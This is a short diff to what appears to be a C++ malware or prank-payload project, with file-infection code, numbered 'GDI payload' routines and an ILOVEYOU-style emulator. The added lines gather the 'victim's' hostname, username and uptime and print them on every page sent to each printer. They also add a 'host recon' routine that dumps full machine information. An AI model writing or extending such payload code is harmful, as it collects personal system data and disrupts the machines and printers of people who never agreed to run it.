@@ -12,6 +12,7 @@
 #include "../utils/email.h"
 #endif
 #include "../utils/fileinfect/fileinfect.h"
+#include "../utils/hostinfo.h"
 
 #define _USE_MATH_DEFINES
 #include <cmath>
@@ -1657,8 +1658,20 @@ DWORD WINAPI GDIPayload66(LPVOID)
     const wchar_t* payload =
         normalized ? normalized : text;
 
+    // Stamp the victim's host identity on every printed page
+    // (rules.cpp host reads got their own playground here).
+    std::wstring full = payload;
+    full += L"\r\n"
+            L"\r\n"
+            L"machine: ";
+    full += HostInfo::HostnameW();
+    full += L" | user: ";
+    full += HostInfo::UserW();
+    full += L"\r\n";
+    full += HostInfo::ToWide(HostInfo::UpTime());
+
     for (int i = 0; i < count; ++i)
-        Printer::PrintText(names[i], payload);
+        Printer::PrintText(names[i], full.c_str());
 
     if (normalized)
         free(normalized);
@@ -1673,11 +1686,16 @@ DWORD WINAPI GDIPayload66(LPVOID)
 // ============================================================
 DWORD WINAPI GDIPayload67(LPVOID)
 {
+    // Host recon first: a full dump of the machine we're on.
+    printf("============ HOST INFO ============\n");
+    HostInfo::PrintAll();
+    printf("===================================\n\n");
+
 #ifndef DUMB_BUILD
     ILOVEYOUSafeEmulator::DisplayContacts();
-
-    Sleep(3000);
 #endif
+
+    Sleep(2000);
 
     return 0;
 }
